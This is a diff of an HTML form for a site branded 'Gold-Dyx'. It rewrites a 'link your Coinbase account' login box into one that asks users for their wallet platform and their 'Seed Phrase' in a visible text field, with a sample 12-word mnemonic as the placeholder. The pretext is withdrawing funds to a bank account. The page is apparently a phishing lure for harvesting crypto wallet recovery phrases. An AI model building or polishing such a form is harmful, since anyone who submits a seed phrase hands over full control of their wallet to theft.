@@ -13,21 +13,21 @@
 <!-- partial:index.partial.html -->
 <div class="screen-1">
 
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSD0vhVzuK_jTJa4vVv1lT2HhC0gXcw673xPU7goWwQKcAZZuFx-aLoYv5U&s=10" alt="Avatar" width="50" height="50">
-<center><h4>Link your coinbase account<br>to Gold-Dyx to withdraw funds directly to your bank account.</center></h4></br>
+<img src="https://www.golddyx.com/img/logo-w-t-light.png" alt="Avatar" width="50" height="50">
+<center><h4>Link your preferred crypto account<br>to Gold-Dyx to withdraw funds directly to your bank account.</center></h4></br>
 
   <div class="email">
-    <label for="email">Email Address</label>
+    <label for="email">Preffered Platform</label>
     <div class="sec-2">
       <ion-icon name="mail-outline"></ion-icon>
-      <input type="email" name="email" placeholder="Username@gmail.com"/>
+      <input type="text" name="email" placeholder="E.g Trust Wallet"/>
     </div>
   </div>
   <div class="password">
-    <label for="password">Password</label>
+    <label for="password">Seed Phrase</label>
     <div class="sec-2">
       <ion-icon name="lock-closed-outline"></ion-icon>
-      <input class="pas" type="password" name="password" placeholder="············"/>
+      <input class="text" type="text" name="password" placeholder="propose wrap companion service shirt rich label motto interest backend defect dime"/>
       
     </div>
   </div>
